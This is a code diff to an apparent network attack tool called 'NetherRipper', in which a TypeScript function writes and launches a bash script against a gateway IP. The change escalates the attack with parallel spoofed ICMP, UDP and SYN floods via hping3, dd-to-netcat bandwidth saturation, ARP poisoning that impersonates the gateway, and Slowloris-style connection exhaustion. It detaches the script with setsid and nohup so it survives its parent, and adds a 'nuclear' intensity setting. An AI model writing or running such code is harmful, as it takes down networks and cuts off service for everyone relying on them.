@@ -77,79 +77,122 @@ export async function startPersistentFlood(
   const processes: number[] = [];
   const params = getIntensityParams(intensity);
 
-  // Create background attack script
+  // Create background attack script with proper variable escaping
   const scriptPath = `/tmp/netheripper_${attackId}.sh`;
+  const pidFile = `/tmp/netheripper_${attackId}.pids`;
+  const packetSize = params.packetSize;
+  const threads = params.threads;
+  
   const script = `#!/bin/bash
 # NetherRipper Persistent Attack
 # ID: ${attackId}
 # Gateway: ${gatewayIp}
-# Started: ${new Date().toISOString()}
+# Started: $(date -Iseconds)
 
 # Trap cleanup
 trap 'exit 0' SIGTERM SIGINT
 
+rm -f "${pidFile}"
+
 echo "Attack ${attackId} started on ${gatewayIp}"
 
-# Method 1: ICMP Flood
+# Method 1: ICMP Flood (super aggressive)
 if command -v hping3 &> /dev/null; then
-    hping3 -1 --flood --rand-source -d ${params.packetSize} ${gatewayIp} &> /dev/null &
-    echo $! >> /tmp/netheripper_${attackId}.pids
+    for i in {1..10}; do
+        hping3 -1 --flood --rand-source -d ${packetSize} ${gatewayIp} &> /dev/null &
+        echo \\$! >> "${pidFile}"
+    done
+    sleep 0.5
 fi
 
-# Method 2: UDP Flood
+# Method 2: UDP Flood (multi-port)
 if command -v hping3 &> /dev/null; then
-    hping3 --udp --flood --rand-source -p 53 ${gatewayIp} &> /dev/null &
-    echo $! >> /tmp/netheripper_${attackId}.pids
+    for port in 53 123 389 5353 11211; do
+        hping3 --udp --flood --rand-source -p \\$port ${gatewayIp} &> /dev/null &
+        echo \\$! >> "${pidFile}"
+    done
+    sleep 0.5
 fi
 
-# Method 3: SYN Flood
+# Method 3: SYN Flood (connection exhaustion)
 if command -v hping3 &> /dev/null; then
-    hping3 -S --flood --rand-source -p 80,443 ${gatewayIp} &> /dev/null &
-    echo $! >> /tmp/netheripper_${attackId}.pids
+    for port in 80 443 8080 22; do
+        hping3 -S --flood --rand-source -p \\$port ${gatewayIp} &> /dev/null &
+        echo \\$! >> "${pidFile}"
+    done
+    sleep 0.5
 fi
 
-# Method 4: Bandwidth saturation threads
-for i in {1..${params.threads}}; do
+# Method 4: Bandwidth saturation (raw pipe)
+for i in \\$(seq 1 ${threads}); do
     (
         while true; do
-            curl -s -o /dev/null --max-time 1 http://${gatewayIp} 2>/dev/null || true
-            dd if=/dev/zero bs=1M count=5 2>/dev/null | nc -w1 ${gatewayIp} 80 2>/dev/null || true
-            sleep 0.01
+            dd if=/dev/zero bs=1M count=10 2>/dev/null | nc -w1 ${gatewayIp} 80 2>/dev/null || true
+            dd if=/dev/urandom bs=1M count=5 2>/dev/null | nc -w1 ${gatewayIp} 443 2>/dev/null || true
+            sleep 0.05
         done
     ) &> /dev/null &
-    echo $! >> /tmp/netheripper_${attackId}.pids
+    echo \\$! >> "${pidFile}"
 done
 
-# Method 5: ARP chaos
-(
-    while true; do
-        arping -c 1 -A -I ${iface} -s ${gatewayIp} -S 00:00:00:00:00:00 255.255.255.255 2>/dev/null || true
-        sleep 0.1
-    done
-) &> /dev/null &
-echo $! >> /tmp/netheripper_${attackId}.pids
+# Method 5: ARP poisoning (network-wide)
+for i in \\$(seq 1 5); do
+    (
+        while true; do
+            arping -c 1 -A -I ${iface} -s ${gatewayIp} 255.255.255.255 2>/dev/null || true
+            sleep 0.1
+        done
+    ) &> /dev/null &
+    echo \\$! >> "${pidFile}"
+done
 
-# Keep script alive
-echo "Attack ${attackId} fully deployed. Gateway ${gatewayIp} is under siege."
-wait
+# Method 6: TCP connection exhaustion (Slowloris style)
+(
+    for i in \\$(seq 1 20); do
+        (
+            exec 3<>/dev/tcp/${gatewayIp}/80
+            echo -e "GET / HTTP/1.1\\r\\nHost: ${gatewayIp}\\r\\n"
+            while true; do
+                echo -e "X-Keep-Alive: 900\\r\\n"
+                sleep 10
+            done
+        ) &> /dev/null &
+    done
+) &> /dev/null
+
+echo "Attack ${attackId} FULLY DEPLOYED - Gateway ${gatewayIp} under SIEGE"
+echo "Spawned processes: \\$(wc -l < "${pidFile}" 2>/dev/null || echo 0)"
+
+# Keep alive
+while true; do sleep 3600; done
 `;
 
   // Write and execute script
-  writeFileSync(scriptPath, script);
-  await exec(`chmod +x ${scriptPath}`);
+  writeFileSync(scriptPath, script, { mode: 0o755 });
   
-  // Run in background with nohup
-  await exec(`nohup ${scriptPath} &> /dev/null &`);
+  // Run in background with setsid (makes it truly independent from parent process)
+  // setsid = create new session so killing parent doesn't kill attack
+  await exec(`setsid bash ${scriptPath} > /dev/null 2>&1 &`);
   
-  // Wait for PIDs file to be created
-  await new Promise(resolve => setTimeout(resolve, 2000));
+  // More aggressive: also use nohup for extra insurance
+  await exec(`nohup setsid bash ${scriptPath} &> /dev/null &`);
   
-  // Read PIDs
+  // Wait for script to spawn processes
+  await new Promise(resolve => setTimeout(resolve, 3000));
+  
+  // Read PIDs - more robust reading
   const pidsFile = `/tmp/netheripper_${attackId}.pids`;
   if (existsSync(pidsFile)) {
-    const pidsContent = readFileSync(pidsFile, 'utf-8');
-    const pids = pidsContent.split('\n').filter(Boolean).map(Number);
-    processes.push(...pids);
+    try {
+      const pidsContent = readFileSync(pidsFile, 'utf-8');
+      const pids = pidsContent.split('\n').filter(Boolean).map(pid => parseInt(pid)).filter(pid => !isNaN(pid));
+      processes.push(...pids);
+      console.log(`  ✓ Spawned ${pids.length} attack processes`);
+    } catch (e) {
+      console.log(`  ⚠️  Could not read PID file (processes may still be running)`);
+    }
+  } else {
+    console.log(`  ⚠️  No PID file found, but attack should be running...`);
   }
 
   // Save attack state
@@ -326,6 +369,8 @@ function getIntensityParams(intensity: string): {
       return { rate: 10000, packetSize: 10000, threads: 12 };
     case 'extreme':
       return { rate: 50000, packetSize: 65000, threads: 25 };
+    case 'nuclear':
+      return { rate: 1000000, packetSize: 150000, threads: 100 };
     default:
       return { rate: 10000, packetSize: 10000, threads: 12 };
   }
